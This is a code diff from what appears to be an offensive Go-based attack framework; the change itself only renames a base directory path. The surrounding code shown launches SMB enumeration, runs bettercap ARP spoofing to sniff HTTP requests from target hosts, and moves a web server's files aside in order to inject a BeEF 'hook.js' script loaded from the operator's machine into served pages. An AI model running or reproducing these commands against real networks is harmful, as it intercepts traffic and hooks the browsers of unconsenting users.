@@ -380,7 +380,7 @@ func Enum4linux(Rhost string) {
         return
     }
     fmt.Printf("\n%s[>] %srunning smb recon on target: %s...\n", bcolors.Green, bcolors.Endc, Rhost)
-    subprocess.Popen(`cd /root/.afr3/afr_base/networks/enum4linux-ng; python3 enum4linux-ng.py -A -v %s`, Rhost)
+    subprocess.Popen(`cd /root/.afr3/africana-base/networks/enum4linux-ng; python3 enum4linux-ng.py -A -v %s`, Rhost)
     return
 }
 
@@ -442,10 +442,10 @@ func PacketSniffer(Mode string, Rhost string) {
     switch strings.ToLower(Mode) {
     case "single":
         fmt.Printf("\nRHOST => %s\nMODE => %s\n\n", Rhost, Mode)
-        subprocess.Popen(`bettercap -caplet /root/.afr3/afr_base/networks/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active'`, Rhost)
+        subprocess.Popen(`bettercap -caplet /root/.afr3/africana-base/networks/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active'`, Rhost)
     case "all":
         fmt.Printf("\nRHOST => %s\nMODE => %s\n\n", Rhost, Mode)
-        subprocess.Popen(`bettercap -caplet /root/.afr3/afr_base/networks/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active'`)
+        subprocess.Popen(`bettercap -caplet /root/.afr3/africana-base/networks/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active'`)
     default:
         fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightRed, Mode, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
@@ -545,7 +545,7 @@ func BeefEttercap(Mode string, Lhost string, Rhost string, Iface string, Passwd 
 
             fileXPath := "/var/www/html/.Files"
             if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
-                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/afr_base/networks/beefhook/* /var/www/html/`)
+                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
                 newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, Lhost)
                 filesToReplacements := map[string]map[string]string{
                     "/var/www/html/index.html": {
@@ -625,7 +625,7 @@ func BeefEttercap(Mode string, Lhost string, Rhost string, Iface string, Passwd 
             }
             fileXPath := "/var/www/html/.Files"
             if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
-                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/afr_base/networks/beefhook/* /var/www/html/`)
+                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
                 newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, Lhost)
                 filesToReplacements := map[string]map[string]string{
                     "/var/www/html/index.html": {
@@ -688,7 +688,7 @@ func BeefBettercap(Mode string, Lhost string, Rhost string, Iface string, Passwd
 
             fileXPath := "/var/www/html/.Files"
             if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
-                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/afr_base/networks/beefhook/* /var/www/html/`)
+                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
                 newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, Lhost)
                 filesToReplacements := map[string]map[string]string{
                     "/var/www/html/index.html": {
@@ -742,7 +742,7 @@ func BeefBettercap(Mode string, Lhost string, Rhost string, Iface string, Passwd
 
             fileXPath := "/var/www/html/.Files"
             if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
-                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/afr_base/networks/beefhook/* /var/www/html/`)
+                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
                 newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, Lhost)
                 filesToReplacements := map[string]map[string]string{
                     "/var/www/html/index.html": {
